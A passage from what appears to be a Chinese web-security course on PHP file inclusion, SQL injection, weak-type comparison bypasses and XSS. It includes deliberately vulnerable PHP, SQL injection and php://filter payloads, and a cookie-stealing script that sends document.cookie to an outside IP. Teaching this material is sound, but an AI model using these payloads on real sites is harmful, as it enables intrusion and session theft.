class="number">0</span>)&#123;</span><br><span class="line">	<span class="keyword">die</span>(<span class="string">&quot;Error&quot;</span>.$conn-&gt;connect_error);</span><br><span class="line">&#125;</span><br><span class="line">$conn-&gt;set_charset(<span class="string">&#x27;utf8&#x27;</span>)<span class="keyword">or</span> <span class="keyword">die</span>(<span class="string">&quot;set charset fail&quot;</span>);</span><br><span class="line">$data =  $conn-&gt;query(<span class="string">&quot;select * from admin&quot;</span>);</span><br><span class="line">var_dump($data-&gt;fetch_array(MYSQL_ASSOC));</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<ul>
<li>select 查询语句</li>
</ul>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SELECT 字段，字段... from 表 where 条件</span><br></pre></td></tr></table></figure>

<ul>
<li>insert into  插入语句</li>
</ul>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">insert into 表名 (字段，字段...)values(值)</span><br></pre></td></tr></table></figure>

<ul>
<li>update 更新语句</li>
</ul>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">update 表名 set 字段&#x3D;新值，字段&#x3D;新值 where 条件</span><br></pre></td></tr></table></figure>

<h3 id="文件包含"><a href="#文件包含" class="headerlink" title="文件包含"></a>文件包含</h3><h4 id="include-require"><a href="#include-require" class="headerlink" title="include/require"></a>include/require</h4><p>获取指定文件中存在的所有文本/代码/标记，并复制到使用 include /require语句的文件中</p>
<ul>
<li>include </li>
</ul>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">include(&quot;conn.php&quot;);</span><br></pre></td></tr></table></figure>

<ul>
<li>require</li>
</ul>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">require(&quot;conn.php&quot;);</span><br></pre></td></tr></table></figure>

<ul>
<li>区别</li>
</ul>
<table>
<thead>
<tr>
<th>函数</th>
<th>区别</th>
</tr>
</thead>
<tbody><tr>
<td>include/require</td>
<td>include发生错误会跑出waring然后继续执行后面的内容，而require发生错误会直接停止程序</td>
</tr>
</tbody></table>
<h4 id="文件包含漏洞"><a href="#文件包含漏洞" class="headerlink" title="文件包含漏洞"></a>文件包含漏洞</h4><p>若include其中的变量能够被用户操控，则可能导致文件包含漏洞，导致**<em>任意代码执行或者任意文件读取**</em>。</p>
<p>实例：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">include</span>($_GET[<span class="string">&#x27;cmd&#x27;</span>]);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<h5 id="利用场景"><a href="#利用场景" class="headerlink" title="利用场景"></a>利用场景</h5><h6 id="执行任意命令"><a href="#执行任意命令" class="headerlink" title="执行任意命令"></a>执行任意命令</h6><ul>
<li><p>若该web服务存在文件上传的地方，我们将我们需要执行的恶意代码嵌入图片文件上传到服务器中，将include中的变量值改成我们存在恶意代码的图片路径这样在文件包含的时候就能执行我们想要执行的恶意代码。</p>
</li>
<li><p>假设我们已经上传恶意图片到网站目录，例如2.jpg在网站根目录，其真实的内容是一段php代码。<img src="C:\Users\51763\Desktop\pic\微信截图_20200607132202.png" alt="微信截图_20200607132202"></p>
</li>
<li><p>我们将图片地址传入，恶意代码被执行</p>
</li>
</ul>
<p><img src="C:\Users\51763\Desktop\pic\微信截图_20200607132400.png" alt="微信截图_20200607132400"></p>
<h6 id="任意文件读取"><a href="#任意文件读取" class="headerlink" title="任意文件读取"></a>任意文件读取</h6><ul>
<li>这里使用php伪协议进行文件读取。PHP伪协议这里不做深究，在后续课程中会重点研究php伪协议以及他的利用</li>
</ul>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?cmd=php:<span class="comment">//filter/read=convert.base64-encode/resource=index.php</span></span><br></pre></td></tr></table></figure>

<ul>
<li>课后实战靶机：</li>
</ul>
<blockquote>
<p><a target="_blank" rel="noopener" href="http://39.107.126.173:8080/">http://39.107.126.173:8080</a></p>
</blockquote>
<ul>
<li>实战案例：</li>
</ul>
<center><strong>Juqingcms 后台文件包含漏洞</strong><center>

<h3 id="SQL注入漏洞的基本原理、利用和防御"><a href="#SQL注入漏洞的基本原理、利用和防御" class="headerlink" title="SQL注入漏洞的基本原理、利用和防御"></a>SQL注入漏洞的基本原理、利用和防御</h3><p>sql语句拼接，导致sql语句被更改导致查询任意数据/执行命令。</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">date_default_timezone_set(<span class="string">&#x27;Asia/Shanghai&#x27;</span>);<span class="comment">//设置时区</span></span><br><span class="line">header(<span class="string">&quot;Content-Type: text/html;charset=utf-8&quot;</span>);<span class="comment">//设置当前文本编码</span></span><br><span class="line">$server = <span class="string">&quot;127.0.0.1&quot;</span>;</span><br><span class="line">$username = <span class="string">&quot;root&quot;</span>;</span><br><span class="line">$passwd = <span class="string">&quot;root&quot;</span>;</span><br><span class="line">$dbname = <span class="string">&quot;sharing&quot;</span>;</span><br><span class="line">$conn = <span class="keyword">new</span> mysqli($server,$username,$passwd,$dbname);</span><br><span class="line"><span class="keyword">if</span> ($conn-&gt;connect_error&lt;&gt;<span class="number">0</span>)&#123;</span><br><span class="line">	<span class="keyword">die</span>(<span class="string">&quot;Error&quot;</span>.$conn-&gt;connect_error);</span><br><span class="line">&#125;</span><br><span class="line">$conn-&gt;set_charset(<span class="string">&#x27;utf8&#x27;</span>)<span class="keyword">or</span> <span class="keyword">die</span>(<span class="string">&quot;set charset fail&quot;</span>);</span><br></pre></td></tr></table></figure>

<ul>
<li>万能密码</li>
</ul>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">&#x27;or 1=1 /* </span></span><br></pre></td></tr></table></figure>

<h5 id="显注"><a href="#显注" class="headerlink" title="显注"></a>显注</h5><h6 id="判断字段数量"><a href="#判断字段数量" class="headerlink" title="判断字段数量"></a>判断字段数量</h6><ul>
<li>order by 查询判断表中字段数量</li>
</ul>
<p>order by 原本是对返回结果进行排序的语句，为什么能够用它来查询数据表中数据字段的个数呢?</p>
<p>基本语法：</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ORDER BY column_name,column_name ASC|DESC;</span><br></pre></td></tr></table></figure>

<p>这是一个对返回 关联数组以id为依据进行降序排序。结果如下图：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">order by id desc</span><br></pre></td></tr></table></figure>

<p><img src="C:\Users\51763\Desktop\pic\微信图片_20200606003529.png" alt="微信图片_20200606003529"></p>
<p>那么多个字段呢</p>
<p><img src="C:\Users\51763\Desktop\pic\微信截图_20200606003936.png" alt="微信截图_20200606003936"></p>
<p>观察发现也是可以的，规律如下，但是这个不是这里的重点。：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">order by A,B        这个时候都是默认按升序排列</span><br><span class="line">order by A desc,B   这个时候 A 降序，B 升序排列</span><br><span class="line">order by A ,B desc  这个时候 A 升序，B 降序排列</span><br></pre></td></tr></table></figure>

<p>我们将id换成数字1会发生什么？我们发现结果是一样的，这就说明数字代表的就是第一个字段id，第二个例子也说明order by可以多字段排列。这样我们就可以order by 1,2,3,4…..这样直到内容报错或者内容改变，就可以知道这个表中存在多少个字段。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">order by 1 desc</span><br></pre></td></tr></table></figure>

<p><img src="C:\Users\51763\Desktop\pic\微信截图_20200606004142.png" alt="微信截图_20200606004142"></p>
<h6 id="判断显注点"><a href="#判断显注点" class="headerlink" title="判断显注点"></a>判断显注点</h6><ul>
<li>union 联合查询判断显注点</li>
</ul>
<blockquote>
<p>连接两条以上的select语句进行联合查询，将所有结果组合成一个结果集,需要注意的是两个查询语句<strong>查询的结果字段数量必须相等</strong>，否则将查询失败</p>
</blockquote>
<p>例如：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select * from qing_content where id&#x3D;&#39;2&#39; union  select * from qing_content where id&#x3D;&#39;3&#39;</span><br></pre></td></tr></table></figure>

<p><img src="C:\Users\51763\Desktop\pic\微信图片_20200607104011.png" alt="微信图片_20200607104011"></p>
<ul>
<li>回到正题，那么如何用它判断显注点呢？我们从上面可以知道联合查询他会返回两个结果集，如果网站只是打印第一个结果我们怎么才能知道哪个字段能够被注入并显示出来呢？我们不妨将第一个select语句的where条件设置为不存在的条件这样他就能直接显示第二个语句也就是我们拼接的语句的结果，我们将第二个语句替换为：</li>
</ul>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">union select 1,2,3......</span><br></pre></td></tr></table></figure>

<ul>
<li>这样如果输出的结果是对应的数字就是说嘛对应字段是能够显注的。我们在Navicat上新建一条查询测试一下。</li>
</ul>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select * from qing_content where id&#x3D;&#39;-2&#39; union  select 1,2,3,4,5,6,7,8,9,10,11,12</span><br></pre></td></tr></table></figure>

<p><img src="C:\Users\51763\Desktop\pic\微信截图_20200607104825.png" alt="微信截图_20200607104825"></p>
<ul>
<li>同样我们在靶机上拼接sql语句进行查询看看：</li>
</ul>
<p><img src="C:\Users\51763\Desktop\pic\微信截图_20200607110842.png" alt="微信截图_20200607110842"></p>
<h6 id="查询数据"><a href="#查询数据" class="headerlink" title="查询数据"></a>查询数据</h6><p>我们知道第四个字段是可以被查询的了，那么我们就可以在第四个字段数写表达式对数据进行查询。例如我们在第四个字段输入</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;127.0.0.1&#x2F;?id&#x3D;-2%27%20union%20%20select%201,2,3,(select%20database()),5,6,7,8,9,10,11,12--+</span><br></pre></td></tr></table></figure>

<p><img src="C:\Users\51763\Desktop\pic\微信截图_20200607111532.png" alt="微信截图_20200607111532"></p>
<ul>
<li>Mysql&gt;=5.7 利用information_schema表对数据库、表信息查询</li>
<li>查询数据库信息</li>
</ul>
<p>sql语句（group_concat(exp)将数组转换为字符串的函数）：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select group_concat(schema_name) from information_schema.schemata</span><br></pre></td></tr></table></figure>

<p><img src="C:\Users\51763\Desktop\pic\微信截图_20200607111751.png" alt="微信截图_20200607111751"></p>
<ul>
<li>查询表信息</li>
</ul>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select group_concat(table_name) from information_schema.tables where table_schema&#x3D;&#39;cms&#39;</span><br></pre></td></tr></table></figure>

<ul>
<li>查询对应表的字段信息例子：</li>
</ul>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select group_concat(column_name) from information_schema.columns where table_name&#x3D;&#39;qing_admin&#39;</span><br></pre></td></tr></table></figure>

<ul>
<li>查询所需数据</li>
</ul>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select group_concat(username) from cms.qing_admin</span><br></pre></td></tr></table></figure>

<h5 id="盲注"><a href="#盲注" class="headerlink" title="盲注"></a>盲注</h5><h6 id="时间盲注"><a href="#时间盲注" class="headerlink" title="时间盲注"></a>时间盲注</h6><ul>
<li>IF函数<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">IF(exp1,exp2,exp3)#IF语句</span><br></pre></td></tr></table></figure>

</li>
</ul>
<p>实际举例，若exp1为ture将会返回A否则返回B</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> <span class="keyword">IF</span>(<span class="literal">TRUE</span>,<span class="string">&#x27;A&#x27;</span>,<span class="string">&#x27;B&#x27;</span>);    <span class="comment">-- 输出结果：A</span></span><br><span class="line"><span class="keyword">SELECT</span> <span class="keyword">IF</span>(<span class="literal">FALSE</span>,<span class="string">&#x27;A&#x27;</span>,<span class="string">&#x27;B&#x27;</span>);   <span class="comment">-- 输出结果：B</span></span><br></pre></td></tr></table></figure>
<ul>
<li>AIISC函数<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ascii()#括号中的参数转化成相应的ascii码</span><br></pre></td></tr></table></figure>

</li>
</ul>
<p>实际举例：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select ascii(&#39;a&#39;)#输出结果为97</span><br></pre></td></tr></table></figure>

<ul>
<li>substr函数</li>
</ul>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">substr(a,b,c)#从b 位置开始，截取字符串a 的c 长度。</span><br></pre></td></tr></table></figure>

<p>实际举例：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select substr(&#39;cxk&#39;,1,1)#返回C</span><br></pre></td></tr></table></figure>

<ul>
<li>sleep 函数</li>
</ul>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sleep(5)#休眠5秒</span><br></pre></td></tr></table></figure>

<ul>
<li>思考一个问题，如果一个网站没有回显我们能不能使用sleep去验证我们的猜想呢？比如我构造一条这样的语句</li>
</ul>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">and if(1&lt;2,sleep(5),0)--+</span><br></pre></td></tr></table></figure>

<ul>
<li>从语句可以知道如果第一个 select 1执行成功，那么将会执行sleep(5)进行五秒的休眠。</li>
<li>可以想到，如果我们在第一个表达式组个对数据库内容进行猜解，如果猜对将会执行5秒钟休眠，例如我对数据库进行猜想,为了节省时间我们可以在猜对时候不进行延时，在猜错时候进行延时。</li>
</ul>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">and if(ascii(substr(database(),1,1))&gt;1,0,sleep(5))--+</span><br></pre></td></tr></table></figure>

<ul>
<li>例如我们猜到&gt;98时候没有发生延时，而在猜到&gt;99时候发生延时，这时候就说明我们数据库的第一个字母是大于98小于99的也就是说明第一个字母的aiisc码是等于99</li>
</ul>
<h6 id="布尔盲注"><a href="#布尔盲注" class="headerlink" title="布尔盲注"></a>布尔盲注</h6><p>布尔盲注与世间盲注类似，主要场景如下，在sql执行成功会返回正确的页面，而执行失败返回错误的页面。例如下面两条语句返回的页面不一样，这样就能判断我们是否猜对</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#39; and mid(version(),2,1)&#x3D;&#39;.&#39; --+</span><br></pre></td></tr></table></figure>

<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#39; and mid(version(),2,1)&#x3D;&#39;a&#39; --+</span><br></pre></td></tr></table></figure>

<h5 id="SQL注入防御方法"><a href="#SQL注入防御方法" class="headerlink" title="SQL注入防御方法"></a>SQL注入防御方法</h5><ul>
<li>过滤</li>
<li>使用预处理</li>
</ul>
<h3 id="弱类型比较问题"><a href="#弱类型比较问题" class="headerlink" title="弱类型比较问题"></a>弱类型比较问题</h3><h4 id="“-”-与“-”"><a href="#“-”-与“-”" class="headerlink" title="“==” 与“===”"></a>“==” 与“===”</h4><ul>
<li>看一个简单的问题</li>
</ul>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$o = $_GET[<span class="string">&#x27;o&#x27;</span>];</span><br><span class="line"><span class="keyword">if</span>(is_numeric($o))&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&quot;no hack!!&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>($o==<span class="number">520</span>)&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;U are right!&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<ul>
<li><p>我们输入传入520却被直接die掉了，但是我们输入520a却发生了神奇的事情，输出了<code>U are right!</code>,看似无解的问题却可以被解决,这是为什么呢？</p>
</li>
<li><p>由于PHP是一门弱类型语言，存在弱类型比较问题。</p>
</li>
<li><p>PHP中<code>==</code>进行比较时候，当数据类型不一样的时候会将数据类型转换为相同的再进行比较。PHP官方手册如此说道：</p>
</li>
</ul>
<ul>
<li>这就很明白了，我们输入字符串<code>520a</code>它与整数<code>520</code>进行比较会先强制转换<code>520a</code>为整数，再与520进行比较。我们可以做个试验看看强制转换为类型后的<code>520a</code>是个什么。</li>
</ul>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">echo</span> intval(<span class="string">&#x27;520a&#x27;</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<ul>
<li>那么如何解决这个问题呢。我们直接使用<code>===</code>三个等于号进行比较即可，因为3个等于号除了对数据的值进行比较还会对数据的类型进行比较。</li>
<li><strong><em><font color=red>特殊例子整数0弱类型比较任何值都是true</font></em></strong></li>
</ul>
<h4 id="switch弱类型比较问题"><a href="#switch弱类型比较问题" class="headerlink" title="switch弱类型比较问题"></a>switch弱类型比较问题</h4><ul>
<li>switch中同样存在弱类型比较问题，原理和上面类似这里仅仅用一个例子作为说明：</li>
</ul>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    $i =<span class="string">&quot;3name&quot;</span>;</span><br><span class="line">    <span class="keyword">switch</span> ($i) &#123;</span><br><span class="line">    <span class="keyword">case</span> <span class="number">0</span>:</span><br><span class="line">    <span class="keyword">case</span> <span class="number">1</span>:</span><br><span class="line">    <span class="keyword">case</span> <span class="number">2</span>:</span><br><span class="line">         <span class="keyword">echo</span> <span class="string">&quot;this is two&quot;</span>;</span><br><span class="line">         <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">case</span> <span class="number">3</span>:</span><br><span class="line">         <span class="keyword">echo</span> <span class="string">&quot;flag&quot;</span>;</span><br><span class="line">    <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line"> <span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<ul>
<li>请同学们回答上面输出的是哪个？</li>
</ul>
<h4 id="MD5-、sha1-哈希函数相等问题"><a href="#MD5-、sha1-哈希函数相等问题" class="headerlink" title="MD5() 、sha1()哈希函数相等问题"></a>MD5() 、sha1()哈希函数相等问题</h4><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>($_POST[<span class="string">&#x27;a&#x27;</span>]) <span class="keyword">and</span> <span class="keyword">isset</span>($_POST[<span class="string">&#x27;b&#x27;</span>])) &#123;</span><br><span class="line"><span class="keyword">if</span> ($_POST[<span class="string">&#x27;a&#x27;</span>] != $_POST[<span class="string">&#x27;b&#x27;</span>])</span><br><span class="line"><span class="keyword">if</span> (md5($_POST[<span class="string">&#x27;a&#x27;</span>]) === md5($_POST[<span class="string">&#x27;b&#x27;</span>]))</span><br><span class="line"><span class="keyword">die</span>(<span class="string">&#x27;Flag: &#x27;</span>.$flag);</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line"><span class="keyword">print</span> <span class="string">&#x27;Wrong.&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<ul>
<li>思考如何让两个不相等的值加密后他们相等？</li>
<li>md5或者sha不能加密数组，所以在加密数组的时候会返回false.</li>
</ul>
<h4 id="十六进制比较问题"><a href="#十六进制比较问题" class="headerlink" title="十六进制比较问题"></a>十六进制比较问题</h4><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">noother_says_correct</span>(<span class="params">$number</span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">       $one = ord(<span class="string">&#x27;1&#x27;</span>);</span><br><span class="line">       $nine = ord(<span class="string">&#x27;9&#x27;</span>);</span><br><span class="line">       <span class="keyword">for</span> ($i = <span class="number">0</span>; $i &lt; strlen($number); $i++)</span><br><span class="line">       &#123;  </span><br><span class="line">               $digit = ord($number&#123;$i&#125;);</span><br><span class="line">               <span class="keyword">if</span> ( ($digit &gt;= $one) &amp;&amp; ($digit &lt;= $nine) )</span><br><span class="line">               &#123;</span><br><span class="line">                       <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">               &#125;</span><br><span class="line">       &#125;</span><br><span class="line">          <span class="keyword">return</span> $number == <span class="string">&#x27;54975581388&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line">$flag=<span class="string">&#x27;*******&#x27;</span>;</span><br><span class="line"><span class="keyword">if</span>(noother_says_correct($_GET[<span class="string">&#x27;key&#x27;</span>]))</span><br><span class="line">   <span class="keyword">echo</span> $flag;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">   <span class="keyword">echo</span> <span class="string">&#x27;access denied&#x27;</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<ul>
<li>这道题的意思就是要求输入一个key，然后这个key必须等于<code>54975581388</code>但是在自定义的函数里面又不允许出现数字，正好<code>54975581388=0xccccccccc</code>这样就绕过了检测。</li>
</ul>
<h4 id="HASH比较操作符问题"><a href="#HASH比较操作符问题" class="headerlink" title="HASH比较操作符问题"></a>HASH比较操作符问题</h4><ul>
<li>首先我们来看两个问题</li>
</ul>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&quot;0e132456789&quot;&#x3D;&#x3D;&quot;0e7124511451155&quot; &#x2F;&#x2F;true</span><br><span class="line">&quot;0e1abc&quot;&#x3D;&#x3D;&quot;0&quot;     &#x2F;&#x2F;true4219903</span><br></pre></td></tr></table></figure>

<ul>
<li>上面的比较确实会通过，那么为什么呢，在比较的时候，当出现xex模式，即匹配：<code>0e\d+</code>的 字符串将会当做科学计数法进行比较。</li>
</ul>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">        <span class="keyword">if</span> (<span class="keyword">isset</span>($_GET[<span class="string">&#x27;Username&#x27;</span>]) &amp;&amp; <span class="keyword">isset</span>($_GET[<span class="string">&#x27;password&#x27;</span>])) &#123;</span><br><span class="line">         $logined = <span class="literal">true</span>;</span><br><span class="line">         $Username = $_GET[<span class="string">&#x27;Username&#x27;</span>];</span><br><span class="line">         $password = $_GET[<span class="string">&#x27;password&#x27;</span>];</span><br><span class="line">         <span class="keyword">if</span> (!ctype_alpha($Username)) &#123;$logined = <span class="literal">false</span>;&#125;</span><br><span class="line">         <span class="keyword">if</span> (!is_numeric($password) ) &#123;$logined = <span class="literal">false</span>;&#125;</span><br><span class="line">         <span class="keyword">if</span> (md5($Username) != md5($password)) &#123;$logined = <span class="literal">false</span>;&#125;</span><br><span class="line">       <span class="keyword">if</span> ($logined)&#123;</span><br><span class="line">       <span class="keyword">echo</span> <span class="string">&quot;successful&quot;</span>;</span><br><span class="line">         &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">               <span class="keyword">echo</span> <span class="string">&quot;login failed!&quot;</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    <span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<ul>
<li>这里绕过就是上面的原理，<code>ctype_alpha</code>函数功能就是检测是否是字符，也就是说我们username必须是数字，而password。必须是字母。再将传入的username和password进行md5加密后进行比较，这里就存在一个问题，如果md5加密后的值是0e开头这样就存在了弱类型比较问题就可以通过。我们可以写脚本爆破寻找纯数字和纯字母md5加密后是0e开头的值。这里最终绕过的<code>payload</code>是</li>
</ul>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">md5(<span class="string">&#x27;240610708&#x27;</span>) == md5(<span class="string">&#x27;QNKCDZO&#x27;</span>)</span><br></pre></td></tr></table></figure>

<h3 id="XSS漏洞的基本原理、利用和防御"><a href="#XSS漏洞的基本原理、利用和防御" class="headerlink" title="XSS漏洞的基本原理、利用和防御"></a>XSS漏洞的基本原理、利用和防御</h3><h4 id="何为XSS漏洞"><a href="#何为XSS漏洞" class="headerlink" title="何为XSS漏洞"></a>何为XSS漏洞</h4><ul>
<li>我们在服务器进行监听某个端口：</li>
</ul>
<p><img src="http://goodcheerleung.gitee.io/blog/nc.png" alt="nc"></p>
<ul>
<li>我们在当前登陆的网站上执行这段js代码：</li>
</ul>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">window.location.href&#x3D;&quot;http:&#x2F;&#x2F;39.107.126.173:25565&#x2F;?cookie&#x3D;&quot;+document.cookie</span><br></pre></td></tr></table></figure>

<p><img src="http://goodcheerleung.gitee.io/blog/%E5%BE%AE%E4%BF%A1%E5%9B%BE%E7%89%87_20200701172652.png" alt="微信图片_20200701172652"></p>
<ul>
<li>在看我们在服务器监听的内容发现我们的cookie已经被发送到我们服务器。黑客通过获取到的cookie信息就能登陆我们的网站后台。这就是所谓xss，xss是跨站脚本攻击（Cross Site Scripting）的简写，但是为什么不是css，是因为与前端的css样式代码重叠了所以被改为xss.</li>
</ul>
<p><img src="http://goodcheerleung.gitee.io/blog/%E5%BE%AE%E4%BF%A1%E6%88%AA%E5%9B%BE_20200701172836.png" alt="微信截图_20200701172836"></p>
<h4 id="反射型XSS"><a href="#反射型XSS" class="headerlink" title="反射型XSS"></a>反射型XSS</h4><p>下面是典型的反射型xss，我们通过get传参，的内容会被直接打印出来。如果我们传入的是一段js代码，他会被直接执行。如果黑客构造这么一个链接，让我们打开我们的cookie就会被窃取。</p>
<p>例如：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;127.0.0.1&#x2F;xss.php?a&#x3D;&lt;script type&#x3D;&quot;text&#x2F;javascript&quot;&gt;window.location.href&#x3D;&quot;http:&#x2F;&#x2F;39.107.126.173:25565&#x2F;?cookie&#x3D;&quot;+document.cookie&lt;&#x2F;script&gt;</span><br></pre></td></tr></table></figure>

<p><strong>xss.php:</strong></p>
